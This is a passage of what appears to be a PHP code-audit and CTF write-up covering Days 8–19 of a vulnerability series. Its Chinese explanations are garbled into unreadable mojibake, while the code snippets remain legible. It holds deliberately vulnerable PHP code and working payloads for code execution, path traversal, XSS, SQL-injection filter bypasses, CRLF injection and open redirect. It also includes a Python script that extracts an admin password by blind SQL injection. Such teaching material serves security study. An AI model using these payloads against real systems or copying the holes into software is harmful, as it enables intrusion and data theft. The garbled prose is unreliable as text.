ÊºèÊ¥ûÁÇπÂú®parse_str($var[&#39;query&#39;]);ÔºåÂÖ∂ÂèòÈáèË¶ÜÁõñÂØºËá¥ÂèØ‰ª•Ë¢´‰øÆÊîπmysqlÊï∞ÊçÆÂ∫ìÈÖçÁΩÆÔºåËÆ©ÂÖ∂Ëøû‰∏äÊàë‰ª¨ÁöÑÊï∞ÊçÆÂ∫ìÁÑ∂ÂêéÁªïËøáÊùÉÈôêÈ™åËØÅ„ÄÇ ÊºèÊ¥û‰∫ßÁîüÁöÑÂéüÂõ†‰∏∫Ê≤°ÊúâËÆæÁΩÆÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÔºåÂç≥Â∞ÜÁªìÊûúÂ≠òÂÖ•resultÔºåËÄåÊòØÁõ¥Êé•Â∞ÜÂèòÈáèËß£ÊûêÂà∞ÂΩìÂâç‰ΩúÁî®Âüü demoÔºö ÂêåÊ†∑‰∫ßÁîüÂèòÈáèË¶ÜÁõñÁöÑÈóÆÈ¢òËøòÊúâÔºö$$‰∫ßÁîüÂèòÈáèË¶ÜÁõñ 1234567&lt;?php$a = 1;$k = $_GET[&apos;k&apos;];$v = $_GET[&apos;v&apos;];$$k = $v;echo $a;// ‰øÆÂ§çÂäûÊ≥ïÂç≥Ê≥®ÂÜåÂèòÈáèÂâçÊ£ÄÊµãÊòØÂê¶ÂèòÈáèÂ∑≤Â≠òÂú® ‰ª•Âèäextract() 12345&lt;?php$a = 1;extract(array(&quot;a&quot;=&gt;&quot;3&quot;));//‰øÆÂ§çÔºöextract(array(&quot;a&quot;=&gt;&quot;3&quot;),EXTR_SKIP);echo $a; Á∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑÁªÉ‰π†È¢òÔºöhttps://xz.aliyun.com/t/2541 Á¨¨‰∏ÄÂÖ≥parse_strÂèòÈáèË¶ÜÁõñÔºåÂº±Á±ªÂûãÊØîËæÉÁªïËøá Á¨¨‰∫åÂÖ≥Êù°‰ª∂Á´û‰∫âÔºåÂà©Áî®0.1ÁßíÊó∂Èó¥Â∑ÆÔºå‰∏Ä‰∏™ÁñØÁãÇÁîüÊàêÊñá‰ª∂Ôºå‰∏Ä‰∏™Ë∞ÉÂ§ßÁ∫øÁ®ãÂéªËÆøÈóÆÂç≥ÂèØ„ÄÇ ÂÖ∂ÂÆûÊµãËØï‰∫Ü‰∏Ä‰∏ãËøôÈáå‰∏çÂä†usleepÂáΩÊï∞‰πüËÉΩÊàêÂäüÊãøÂà∞flagÔºåÂè™ÊòØÊ¶ÇÁéáÂ∞è‰∫Ü‰∏Ä‰∫õËÄåÂ∑≤ Day 8 - CandleËÄÉÂØüÔºöpreg_replace()e‰øÆÈ•∞Á¨¶‰ª£Á†ÅÊâßË°å1234567891011121314&lt;?phpheader(&quot;Content-Type: text/plain&quot;);function complexStrtolower($regex, $value) &#123; return preg_replace( &apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value );&#125;foreach ($_GET as $regex =&gt; $value) &#123; echo complexStrtolower($regex, $value) . &quot;\n&quot;;&#125; preg_replace()e‰øÆÈ•∞Á¨¶ÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÂèØÈÄ†Êàê‰ª£Á†ÅÊâßË°åËøôÈáåÁî±‰∫éÁ¨¨‰∫å‰∏™ÂèÇÊï∞Áî®ÁöÑÂèåÂºïÂè∑ÔºåÂèØÂØºËá¥{${phpinfo()}}ËØ•ÁâπÊÆäÁöÑÂèØÂèòÂèòÈáèË¢´ÊâßË°å„ÄÇ Ê≠£ÂàôÁöÑÂèçÂêëÂºïÁî®Ôºöhttps://xz.aliyun.com/t/2557 ÂÖ≥‰∫éÂèçÂêëÂºïÁî®ÁöÑÁêÜËß£Ôºöhttps://blog.csdn.net/lxcnn/article/details/4146148https://blog.csdn.net/lxcnn/article/details/4476746 payloadÔºöhttps://127.0.0.1/?\S*={${phpinfo()}} Day 9 - RabbitËÄÉÂØüstr_replace()ËøáÊª§‰∏ç‰∏•123456789101112131415161718class LanguageManager &#123; public function loadLanguage() &#123; $lang = $this-&gt;getBrowserLanguage(); $sanitizedLang = $this-&gt;sanitizeLanguage($lang); require_once(&quot;/lang/$sanitizedLang&quot;); &#125; private function getBrowserLanguage() &#123; $lang = $_SERVER[&apos;HTTP_ACCEPT_LANGUAGE&apos;] ?? &apos;en&apos;; return $lang; &#125; private function sanitizeLanguage($language) &#123; return str_replace(&apos;../&apos;, &apos;&apos;, $language); &#125;&#125;(new LanguageManager())-&gt;loadLanguage(); payloadÔºö..././Êàñ....// Â¶ÇÊûúËøáÊª§ÊñπÂºè‰∏∫:str_replace(array(&#39;../&#39;,&#39;./&#39;), &#39;&#39;, $dir);Êàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†ËøôÊ†∑ÁöÑpayloadÔºö.....///=&gt;../Êù•ËøõË°åÁõÆÂΩïÈÅçÂéÜ ‰øÆÂ§çÊñπÊ°àÔºöÂèØ‰ª•‰ΩøÁî®ÈÄíÂΩíÁöÑËøáÊª§ÔºåÊàñËÄÖÔºöstr_replace(&#39;..&#39;, &#39;&#39;, $language) Á∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑctfÈ¢òÁõÆÔºöhttps://xz.aliyun.com/t/2633Âà©Áî®ÂèòÈáèË¶ÜÁõñÁªïËøáaddslashesÁöÑÂºïÂè∑ÈôêÂà∂‰ªéËÄåÂØºËá¥Ê≥®ÂÖ•Ôºö Day 10 - Anticipation1234567891011121314151617&lt;?phpextract($_POST);function goAway() &#123; error_log(&quot;Hacking attempt.&quot;); header(&apos;Location: /error/&apos;);&#125;if (!isset($pi) || !is_numeric($pi)) &#123; goAway();&#125;if (!assert(&quot;(int)$pi == 3&quot;)) &#123; echo &quot;This is not pi.&quot;;&#125; else &#123; echo &quot;This might be pi.&quot;;&#125; Á®ãÂ∫èÊú™exit()ÔºåÂä†‰∏äÂèòÈáèË¶ÜÁõñÂØºËá¥‰ª£Á†ÅÊâßË°å„ÄÇpayload:pi=phpinfo() Day 12 - String Lights1234567891011121314$sanitized = [];foreach ($_GET as $key =&gt; $value) &#123; $sanitized[$key] = intval($value);&#125;$queryParts = array_map(function ($key, $value) &#123; return $key . &apos;=&apos; . $value;&#125;, array_keys($sanitized), array_values($sanitized));$query = implode(&apos;&amp;&apos;, $queryParts);echo &quot;&lt;a href=&apos;/images/size.php?&quot; . htmlentities($query) . &quot;&apos;&gt;link&lt;/a&gt;&quot;; htmlentitiesÂáΩÊï∞‰ΩøÁî®‰∏çÂΩìÔºåÂä†‰∏äintvalÂè™ÂØπÊï∞ÁªÑÁöÑÂÄºËøõË°åËΩ¨Êç¢ÔºåÊ≤°ÊúâÂØπÈîÆËøõË°åËΩ¨Êç¢ÔºåÂØºËá¥xss„ÄÇ htmlentitiesÔºöÂäüËÉΩÂç≥ÁºñÁ†Å‰∏Ä‰∫õÁâπÊÆäÁ¨¶Âè∑ ‰ΩÜÊòØÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÁöÑÈªòËÆ§ÈÖçÁΩÆ‰ºö‰∏çÁºñÁ†ÅÂçïÂºïÂè∑ÔºåËøôÂ∞±ÂØºËá¥‰∫ÜËøôÈáåÂçïÂºïÂè∑Ë¢´Èó≠Âêà payload:?a&#39;onclick=alert(1)//=c Á∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑctfÈ¢òÔºöhttps://github.com/hongriSec/PHP-Audit-Labs/tree/master/Part1/Day12/files1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phprequire &apos;db.inc.php&apos;;if(isset($_REQUEST[&apos;username&apos;]))&#123; if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&apos;username&apos;]))&#123; die(&quot;Attack detected!!!&quot;); &#125;&#125;if(isset($_REQUEST[&apos;password&apos;]))&#123; if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&apos;password&apos;]))&#123; die(&quot;Attack detected!!!&quot;); &#125;&#125;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;echo $query;$result=mysql_query($query,$con);//var_dump($result);while($row = mysql_fetch_array($result))&#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot; . $row[&apos;name&apos;] . &quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;;&#125;?&gt; Âíå‰πãÂâç‰∏ç‰∏ÄÊ†∑ÁöÑÊòØÔºåËøôÈáåÂêåÊ†∑Áî®‰∫ÜhtmlentitiesËøõË°åÁºñÁ†ÅËΩ¨Êç¢ÔºåËøôÈáåÈÖçÁΩÆ‰∫ÜENT_QUOTESÔºå‰ΩøÂæóÂçïÂèåÂºïÂè∑ÈÉΩ‰ºöË¢´ËΩ¨‰πâÔºåÊó†Ê≥ïÈó≠ÂêàsqlËØ≠Âè•„ÄÇ‰ΩÜÊòØÂõ†‰∏∫Ê≤°ÊúâËøáÊª§\Ôºå‰ΩøÂæóÊàë‰ª¨ÂèØ‰ª•ËΩ¨‰πâÂçïÂºïÂè∑Ôºö ÂêéÊù•ÁúãwpËøòÊúâ‰∏ÄÁßçÊúâÊÑèÊÄùÊÄùË∑ØÔºöhttps://xz.aliyun.com/t/2829#toc-4 ‰ªîÁªÜÁúãÊàë‰ª¨‰ºöÂèëÁé∞ËøáÊª§ÁöÑÊó∂ÂÄô‰ΩøÁî®ÁöÑÊòØ$_REQUESTÊù•Ëé∑ÂèñÂèÇÊï∞ÔºåËÄåËé∑ÂèñÊü•Â∫ìÊìç‰ΩúÁöÑÂèòÈáè‰ª•$_GETÂΩ¢ÂºèÂºïÂÖ•ÔºåËøôÈáåÊúâ‰∏Ä‰∏™Áúã‰ºº‰∏çËµ∑ÁúºÁöÑÂ∑ÆÂºÇ„ÄÇ Âú®php.ini‰∏≠ÔºåÂõ†‰∏∫$_REQUESTÂíågpcÊúâÂÖ±Âêå‰πãÂ§ÑÔºåËÄå‰∏ãÂõæ‰∏≠GPCSÂç≥$_REQUESTÂä†ËΩΩÊµÅÁ®ã,G:GetÔºåP:PostÔºåC:CookieÔºåS:Server„ÄÇ ÂèØ‰ª•Áü•ÈÅìpostÂú®get‰πãÂêéÔºåÂ¶ÇÊûúÊàë‰ª¨ÂêåÊó∂‰º†ÂÖ•getÂíåpostÁõ∏ÂêåÂèÇÊï∞ÔºåÂàô$_REQUESTËé∑ÂèñÂà∞ÁöÑÊòØpostÔºåÂõ∫ÁÑ∂Êàë‰ª¨Â∞±ÂèØ‰ª•Âà©Áî®Ëøô‰∏™ÁÇπÁªïËøáËøáÊª§ÈôêÂà∂„ÄÇ Day 13 - Turkey Baster123456789101112131415161718192021222324252627282930313233343536class LoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $user = $this-&gt;sanitizeInput($this-&gt;user); $pass = $this-&gt;sanitizeInput($this-&gt;password); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select(&quot;COUNT(p)&quot;) -&gt;from(&quot;User&quot;, &quot;u&quot;) -&gt;where(&quot;user = &apos;$user&apos; AND password = &apos;$pass&apos;&quot;); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input, $length = 20) &#123; $input = addslashes($input); if (strlen($input) &gt; $length) &#123; $input = substr($input, 0, $length); &#125; return $input; &#125;&#125;$auth = new LoginManager($_POST[&apos;user&apos;], $_POST[&apos;passwd&apos;]);if (!$auth-&gt;isValid()) &#123; exit;&#125; ÂÖ∂ÂÆûËøô‰∏™ÁÇπÂíåday12ÊúâÁõ∏‰ºº‰πãÂ§ÑÔºåËøôÊÆµ‰ª£Á†ÅËôΩÁÑ∂‰ΩøÁî®‰∫Üaddslashes()ÂáΩÊï∞Êù•ËΩ¨‰πâÂºïÂè∑ÔºåÈóÆÈ¢òÂá∫Âú®‰ªñ‰ºöÁî®substr()Êà™Êñ≠ÈïøÂ∫¶Â§ß‰∫é20ÁöÑÈÉ®ÂàÜÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÂÉèday12‰∏≠‰∏ÄÊ†∑ÔºåÂà©Áî®substrÂ∞Ü\&#39;ÁöÑ&#39;ÁªôÊà™Êñ≠ÊéâÔºåÂØºËá¥ËΩ¨‰πâÂéüÊú¨ÁöÑÂçïÂºïÂè∑ÔºåÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Ê≥®ÂÖ•‰∫Ü„ÄÇÂΩìÁÑ∂ËøôÁ±ªÊºèÊ¥ûÂ±ÄÈôêÂ∞±ÊòØ‰∏ÄËà¨Â≠òÂú®‰∫éÂèåÊù°‰ª∂Êü•ËØ¢ÁöÑÈ°µÈù¢„ÄÇ Á∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑÁªÉ‰π†È¢òÔºöhttps://xz.aliyun.com/t/2864 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phprequire &apos;db.inc.php&apos;; function dhtmlspecialchars($string) &#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = dhtmlspecialchars($val); &#125; &#125; else &#123; $string = str_replace(array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;, &apos;(&apos;, &apos;)&apos;), array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;, &apos;Ôºà&apos;, &apos;Ôºâ&apos;), $string); if (strpos($string, &apos;&amp;amp;#&apos;) !== false) &#123; $string = preg_replace(&apos;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&apos;, &apos;&amp;\\1&apos;, $string); &#125; &#125; return $string; &#125; function dowith_sql($str) &#123; $check = preg_match(&apos;/select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is&apos;, $str); if ($check) &#123; echo &quot;ÈùûÊ≥ïÂ≠óÁ¨¶!&quot;; exit(); &#125; return $str; &#125; // ÁªèËøáÁ¨¨‰∏Ä‰∏™wafÂ§ÑÁêÜ foreach ($_REQUEST as $key =&gt; $value) &#123; $_REQUEST[$key] = dowith_sql($value); // Áî®Áõ∏ÂêåÂèÇÊï∞ÁöÑ$_POSTÂéªË¶ÜÁõñÊéâ$_GET &#125; // ÁªèËøáÁ¨¨‰∫å‰∏™WAFÂ§ÑÁêÜ $request_uri = explode(&quot;?&quot;, $_SERVER[&apos;REQUEST_URI&apos;]); // ËøôÈáåÊãøÂà∞ÁöÑÊòØ$_GET if (isset($request_uri[1])) &#123; $rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]); foreach ($rewrite_url as $key =&gt; $value) &#123; $_value = explode(&quot;=&quot;, $value); if (isset($_value[1])) &#123; $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1])); // Ê≤°ËøáÊª§ÈîÆÔºåÂè™ËøáÊª§‰∫Üvalue &#125; &#125; &#125; // ‰∏öÂä°Â§ÑÁêÜ if (isset($_REQUEST[&apos;submit&apos;])) &#123; $user_id = $_REQUEST[&apos;i_d&apos;]; $sql = &quot;select * from phpAuditLabs.users where id=$user_id&quot;; echo $sql; $result=mysql_query($sql); while($row = mysql_fetch_array($result)) &#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot; . $row[&apos;name&apos;] . &quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; &#125;?&gt; ÂêåÊ†∑‰πüÊòØ$_REQUESTËé∑ÂèñÂèÇÊï∞Ë¶ÜÁõñÈóÆÈ¢òÂêåday12ÔºåÁõ∏ÂêåÂèÇÊï∞ÂêçÊó∂$_POST‰ºöË¶ÜÁõñÊéâ$_GETÔºåËÄåÂú®ÂÖ∂Â§ÑÁêÜ$_SERVER[&#39;REQUEST_URI&#39;]ÂÜç‰∏ÄÊ¨°ÂØπuri‰∏≠ÁöÑÂèÇÊï∞Áªô$_REQUESTËøõË°åÊ≥®ÂÜåÔºåÂπ∂‰∏îÊ≤°ÊúâÊ†°È™åsqlÊ≥®ÂÖ•„ÄÇ ËøôÈáåËøòÊúâ‰∏ÄÁßçËß£Ê≥ïÂ∞±ÊòØÂà©Áî®httpÂèÇÊï∞Ê±°ÊüìÊºèÊ¥ûÔºåÊÄùË∑ØÂíåday14‰∏ÄËá¥„ÄÇ Day 14 - SnowmanËÄÉÁÇπÔºöÂèòÈáèË¶ÜÁõñÂèäÁõÆÂΩïÈÅçÂéÜgetshell 123456789101112131415161718192021222324&lt;?phpclass Carrot &#123;const EXTERNAL_DIRECTORY = &apos;/tmp/&apos;;private $id;private $lost = 0;private $bought = 0;public function __construct($input) &#123;$this-&gt;id = rand(1, 1000);foreach ($input as $field =&gt; $count) &#123;$this-&gt;$field = $count++;&#125;&#125;public function __destruct() &#123;file_put_contents(self::EXTERNAL_DIRECTORY . $this-&gt;id,var_export(get_object_vars($this), true));&#125;&#125;$carrot = new Carrot($_GET); payload:../11.php&amp;shell=1&#39;,)%0a&lt;%3fphp+phpinfo();?&gt;// Á∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑctfÈ¢òÔºö https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ ÂØÜÁ†Å: 59t2 Ëøô‰∏™È¢òÁöÑÊºèÊ¥ûÂÖ≥ÈîÆÂú®‰∫é$_SERVER[&#39;REQUEST_URI&#39;]Âíå$_GETÂ§ÑÁêÜÁ©∫Ê†º„ÄÅ.„ÄÅ[ÁöÑÂ∑ÆÂºÇÈÄ†Êàê„ÄÇ $_GETÂèòÈáèÂú®Â§ÑÁêÜÂèÇÊï∞ÁöÑÊó∂ÂÄôÔºå‰ºöÂ∞ÜÂèÇÊï∞Âêç‰∏≠ÁöÑÁ©∫Ê†º„ÄÅ.„ÄÅ[ÊõøÊç¢Êàê_ÔºåËÄå$_SERVER[&#39;REQUEST_URI&#39;]‰∏ç‰ºöÔºåËøôÂ∞±Âú®Ê≥®ÂÜåÂèòÈáèÁöÑÊó∂ÂÄô‰∫ßÁîü‰∫Ü‰∏Ä‰∏™Â∑ÆÂºÇ„ÄÇËøôÁßçÊºèÊ¥ûÁß∞‰∏∫HPPÔºàHTTP Parameter PollutionÔºâdemo: payload:?message_id=-1 union select 1,flag,3,4 from flag&amp;message.id=1 Â´ñÁöÑÂéüÁêÜÂõæÔºö Day 15 - Sleigh Ride $_SERVER[&#39;PHP_SELF&#39;]ÈÖçÂêà‰∏Ä‰∫õÁâπÊÆäÁöÑurlËß£ÊûêÊ®°Âºè(Â¶ÇPATH_INFO)ÂØºËá¥ÁöÑÊºèÊ¥û 1234567891011121314151617181920212223class Redirect &#123; private $websiteHost = &apos;www.example.com&apos;; private function setHeaders($url) &#123; $url = urldecode($url); header(&quot;Location: $url&quot;); &#125; public function startRedirect($params) &#123; $parts = explode(&apos;/&apos;, $_SERVER[&apos;PHP_SELF&apos;]); $baseFile = end($parts); $url = sprintf( &quot;%s?%s&quot;, $baseFile, http_build_query($params) ); $this-&gt;setHeaders($url); &#125;&#125;if ($_GET[&apos;redirect&apos;]) &#123; (new Redirect())-&gt;startRedirect($_GET[&apos;params&apos;]);&#125; ËøôÈáåÂ¶ÇÊûúURLÊòØPATH_INFOÁöÑÊó∂ÂÄôÔºåÊØîÂ¶Çhttps://demo.com/index.php/adminÂÆûÈôÖ‰∏äËøòÊòØËÆøÈóÆÁöÑindex.phpËøôÊ†∑ÁöÑÂÖ•Âè£Êñá‰ª∂„ÄÇÊØîÂ¶ÇÔºöhttps://demo.com/index.php/https://baidu.comÔºå$_SERVER[&#39;PHP_SELF&#39;]Ëé∑ÂèñÂà∞ÁöÑÊòØ/index.php/https://baidu.comÔºåËÄåËøôÈáå‰ºöexplodeÂ§ÑÁêÜ/ÔºåÂèñÊï∞ÁªÑÁöÑÊúÄÂêé‰∏Ä‰∏™‰Ωú‰∏∫ $baseFileÔºåÁî±‰∫é‰ª£Á†Å‰∏≠ËÆæÁΩÆheader()ÂâçÊúâ‰∏ÄÊ¨°urlËß£Á†ÅÔºåËøôÂ∞±ÂØºËá¥‰∫ÜÊàë‰ª¨ÂèØ‰ª•‰∫åÊ¨°urlÁºñÁ†ÅÁªïËøáËøô‰∏™/ÈôêÂà∂ÔºåpayloadÔºöhttps://demo.com/index.php/http:%252f%252fbaidu.com?redirect=1&amp;params[a]=1 ËøôÊ†∑Â∞±‰∫ßÁîü‰∫Ü‰∏Ä‰∏™urlË∑≥ËΩ¨ÊºèÊ¥û„ÄÇ Á∫¢Êó•ÂÆâÂÖ®Êèê‰æõÁöÑctfÈ¢òÔºöhttps://xz.aliyun.com/t/3178 1234567891011121314151617181920212223242526272829&lt;?php include &quot;./config.php&quot;;include &quot;./flag.php&quot;;error_reporting(0);$black_list = &quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&apos;|&quot;;$black_list .= &quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;if(preg_match($black_list, $_GET[&apos;user&apos;])) exit(&quot;:P&quot;); if(preg_match($black_list, $_GET[&apos;pwd&apos;])) exit(&quot;:P&quot;); $query=&quot;select user from users where user=&apos;$_GET[user]&apos; and pwd=&apos;$_GET[pwd]&apos;&quot;;echo &quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;;$result = $conn-&gt;query($query);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); if($row[&apos;user&apos;]) echo &quot;&lt;h2&gt;Welcome &#123;$row[&apos;user&apos;]&#125;&lt;/h2&gt;&quot;;&#125;$result = $conn-&gt;query(&quot;select pwd from users where user=&apos;admin&apos;&quot;);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $admin_pass = $row[&apos;pwd&apos;];&#125;if(($admin_pass)&amp;&amp;($admin_pass === $_GET[&apos;pwd&apos;]))&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; ÂæàÊòéÊòæÊòØsqlÊ≥®ÂÖ•ÁöÑÁªïËøáÔºå‰ªîÁªÜÂàÜÊûêËøáÊª§ËßÑÂàôÂèØ‰ª•ÂèëÁé∞Ê≤°ÊúâËøáÊª§\ÔºåÂõ†‰∏∫ÊòØÂèåÊù°‰ª∂Êü•ËØ¢ËøôÊ†∑Â∞±ÂèØ‰ª•Èó≠ÂêàÂºïÂè∑‰∫Ü„ÄÇËøôÈáåÈúÄË¶ÅÊ≥®Âá∫adminÁöÑÂØÜÁ†ÅÂ∞±ËÉΩÊãøflag„ÄÇ payloadÔºö?user=\&amp;pwd=||/**/pwd/**/REGEXP/**/&quot;^8&quot;;%00 exp:12345678910111213141516import stringimport requestsimport rechar_set = &apos;0123456789abcdefghijklmnopqrstuvwxyz_&apos;pw = &apos;&apos;while 1: for ch in char_set: url = &apos;https://localhost/CTF/?user=\\&amp;pwd=||pwd/**/regexp/**/&quot;^%s&quot;;%%00&apos; r = requests.get(url=url%(pw+ch)) if &apos;Welcome Admin&apos; in r.text: pw += ch print(pw) break if ch == &apos;_&apos;: breakr = requests.get(&apos;https://localhost/CTF/?user=&amp;pwd=%s&apos; % pw)print(re.findall(&apos;HRCTF&#123;\S&#123;1,50&#125;&#125;&apos;,r.text)[0]) ËøôÁßçÊ≥®ÂÖ•ÊñπÂºèÂ±ÄÈôêÂú®‰∫éÂè™ËÉΩÊåáÂÆöÂêå‰∏ÄË°®‰∏≠ÁöÑÂÖ∂‰ªñÂ≠óÊÆµ„ÄÇ Day 16 - Poem1234567891011121314151617181920212223242526272829303132333435class FTP &#123; public $sock; public function __construct($host, $port, $user, $pass) &#123; $this-&gt;sock = fsockopen($host, $port); $this-&gt;login($user, $pass); $this-&gt;cleanInput(); $this-&gt;mode($_REQUEST[&apos;mode&apos;]); $this-&gt;send($_FILES[&apos;file&apos;]); &#125; private function cleanInput() &#123; $_GET = array_map(&apos;intval&apos;, $_GET); $_POST = array_map(&apos;intval&apos;, $_POST); $_COOKIE = array_map(&apos;intval&apos;, $_COOKIE); &#125; public function login($username, $password) &#123; fwrite($this-&gt;sock, &quot;USER &quot; . $username . &quot;\n&quot;); fwrite($this-&gt;sock, &quot;PASS &quot; . $password . &quot;\n&quot;); &#125; public function mode($mode) &#123; if ($mode == 1 || $mode == 2 || $mode == 3) &#123; fputs($this-&gt;sock, &quot;MODE $mode\n&quot;); &#125; &#125; public function send($data) &#123; fputs($this-&gt;sock, $data); &#125;&#125;new FTP(&apos;localhost&apos;, 21, &apos;user&apos;, &apos;password&apos;); $_REQUEST[&#39;mode&#39;]Ëé∑ÂèñÊï∞ÊçÆÊú™ÁªèËøáÊª§+Âº±Á±ªÂûãÊØîËæÉpayload:?mode=1%0a%0dDELETE%20test.file Day 17 - Mistletoemd5($this-&gt;password, true)ÁªïËøáaddslashes1234567891011121314151617181920212223242526272829303132333435class RealSecureLoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $pass = md5($this-&gt;password, true); $user = $this-&gt;sanitizeInput($this-&gt;user); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select(&quot;COUNT(p)&quot;) -&gt;from(&quot;User&quot;, &quot;u&quot;) -&gt;where(&quot;password = &apos;$pass&apos; AND user = &apos;$user&apos;&quot;); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input) &#123; return addslashes($input); &#125;&#125;$auth = new RealSecureLoginManager( $_POST[&apos;user&apos;], $_POST[&apos;passwd&apos;]);if (!$auth-&gt;isValid()) &#123; exit;&#125; ÊâÄÊúâÁöÑËæìÂÖ•Êï∞ÊçÆÈÉΩË¢´addslashesËøáÊª§‰∫Ü‰∏ÄÈÅçÔºåËøôÈáåÁúã‰ººÊ≤°ÊúâÂäûÊ≥ïÈó≠ÂêàsqlËØ≠Âè•ÁöÑÂºïÂè∑ÔºåÂÖ∂ÂÆûËøôÈáåÈóÆÈ¢òÂá∫Âú®md5()ÂáΩÊï∞‰∏äÔºöhttps://php.net/manual/zh/function.md5.php Â¶ÇÊûúÁ¨¨‰∫å‰∏™ÂèÇÊï∞ËÆæÁΩÆ‰∏∫trueÔºåÂàô‰ª•ÂéüÂßãÁöÑ‰∫åËøõÂà∂Êï∞ÊçÆËøîÂõû„ÄÇ ÈÇ£‰πàÊúâÊ≤°ÊúâÂèØËÉΩËÆ©md5($string, true),ÊúÄÂêé‰∏Ä‰ΩçÂá∫Áé∞\Âë¢„ÄÇ Ë∑ëÂá∫Êù•md5(&quot;128&quot;,true);ÁöÑÊúÄÂêé‰∏Ä‰Ωç‰∏∫\123456789&lt;?phpfor($i=1; $i&lt;9999; $i++)&#123; $string = md5($i,true); if(substr($string,-1) == &quot;\\&quot;)&#123; echo $i.&quot;\n&quot;.$string; break; &#125;&#125; ‰πãÂêéÁöÑÊ≥®ÂÖ•ÊµÅÁ®ãÂ∞±ÂíåÂâçÈù¢ÊâÄËø∞‰∏ÄËá¥‰∫Ü„ÄÇ ËøòÊúâ‰∏Ä‰∫õÊØîËæÉÊúâÊÑèÊÄùÁöÑÁÇπÊØîÂ¶ÇÔºömd5(&quot;ffifdyop&quot;,true); // &#39;or&#39;6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbmd5(&quot;129581926211651571912466741651878684928&quot;,true); // ÔøΩT0DÔøΩÔøΩo#ÔøΩÔøΩ&#39;or&#39;8 ÂèØ‰ª•Áî®Êù•ÁªïËøáËøôÊ†∑ÁöÑÂú∫ÊôØÔºö12ÂéüÂÖàÔºöSELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;md5($password,true)&apos;ÂèòÊàêÔºöSELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&apos;or&apos;6\xc9]\x99&apos; and‰ºòÂÖàÁ∫ßÊØîorÈ´òÔºåÂØºËá¥Êï¥‰∏™whereÂ≠êÂè•‰∏∫ÁúüÔºåÂç≥ÂøÖÁÑ∂‰ºöÂá∫Êï∞ÊçÆ„ÄÇ Á∫¢Êó•ÂÆâÂÖ®ÂàÜ‰∫´‰∫Ü‰∏ÄÈÅìËøô‰∏™ËÄÉÁÇπÁöÑÈ¢òÔºöhttps://xz.aliyun.com/t/3375 Day 18 - Sign123456789101112class JWT &#123; public function verifyToken($data, $signature) &#123; $pub = openssl_pkey_get_public(&quot;file://pub_key.pem&quot;); $signature = base64_decode($signature); if (openssl_verify($data, $signature, $pub)) &#123; $object = json_decode(base64_decode($data)); $this-&gt;loginAsUser($object); &#125; &#125;&#125;(new JWT())-&gt;verifyToken($_GET[&apos;d&apos;], $_GET[&apos;s&apos;]); Day 19 - Birch123456789101112131415161718192021222324252627class ImageViewer &#123; private $file; function __construct($file) &#123; $this-&gt;file = &quot;images/$file&quot;; 